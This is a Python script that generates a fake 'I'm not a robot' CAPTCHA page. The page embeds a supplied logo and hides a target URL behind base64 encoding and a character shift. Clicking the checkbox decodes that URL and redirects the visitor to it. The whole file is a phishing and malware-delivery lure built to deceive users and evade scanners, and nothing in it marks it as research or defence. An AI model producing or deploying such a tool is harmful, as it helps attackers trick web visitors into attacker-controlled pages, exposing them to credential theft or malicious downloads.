import sys
import base64

# Retrieve command-line arguments
if len(sys.argv) != 3:
    print("Usage: python notCAPTCHA.py <URL> <SVG_file>")
    sys.exit(1)

url = sys.argv[1]
svg_file = sys.argv[2]

# Read the SVG file and encode it to base64
with open(svg_file, "rb") as file:
    svg_data = file.read()

base64_string = base64.b64encode(svg_data).decode()

# Additional obfuscation to the URL
obfuscated_url = base64.b64encode(url.encode()).decode()

# Shift operation on the base64-encoded URL
shifted_url = "".join(chr(ord(c) + 1) for c in obfuscated_url)

# Construct the HTML content
html_content = f'''
<!DOCTYPE html>
<html>
  <head>
    <style>
      /* CSS styles for the captcha */
      .captcha-container {{
        font-family: "Source Sans Pro", sans-serif;
        text-align: center;
      }}

      .captcha-checkbox-window {{
        display: inline-block;
        width: 300px;
        background-color: #f9f9f9;
        border-radius: 3px;
        border: 1px solid #d3d3d3;
        padding: 10px;
      }}

      .captcha-checkbox-container {{
        width: 28px;
        height: 28px;
        display: inline-block;
        vertical-align: middle;
      }}

      .captcha-checkbox {{
        position: relative;
        background-color: #fff;
        border-radius: 2px;
        height: 100%;
        width: 100%;
        border: 2px solid #c1c1c1;
        outline: none;
        transition: border-color 0.3s;
        cursor: pointer;
      }}

      .captcha-checkbox:hover {{
        border-color: #b2b2b2;
      }}

      .captcha-label {{
        margin: 5px 0;
        font-size: 16px;
        color: #282727;
      }}

      .captcha-logo {{
        width: 66px;
        height: 66px;
        vertical-align: middle;
        margin-left: 10px;
      }}

      .captcha-desc {{
        font-size: 12px;
        color: #555555;
        margin: 5px 0;
      }}
    </style>
  </head>
  <body>
    <div class="captcha-container">
      <div class="captcha-checkbox-window">
        <div class="captcha-checkbox-container">
          <button type="button" class="captcha-checkbox"></button>
        </div>
        <p class="captcha-label">I'm not a robot</p>
        <img src="data:image/svg+xml;base64,{base64_string}" class="captcha-logo" alt="" />
        <p class="captcha-desc">Privacy - Terms</p>
      </div>
    </div>

    <script>
      // Add event listener to the checkbox
      document.querySelector(".captcha-checkbox").addEventListener("click", function () {{
        // Retrieve the shifted URL
        var shiftedUrl = "{shifted_url}";
        
        // Deobfuscate the URL by reversing the shift operation
        var deobfuscatedUrl = "";
        for (var i = 0; i < shiftedUrl.length; i++) {{
          deobfuscatedUrl += String.fromCharCode(shiftedUrl.charCodeAt(i) - 1);
        }}
        
        // Decode the deobfuscated URL from base64 and navigate to it
        window.location.href = window.atob(deobfuscatedUrl);
      }});
    </script>
  </body>
</html>
'''

# Save the HTML content to a file
with open("notCAPTCHA.html", "w") as file:
    file.write(html_content)

print("HTML file generated: notCAPTCHA.html")
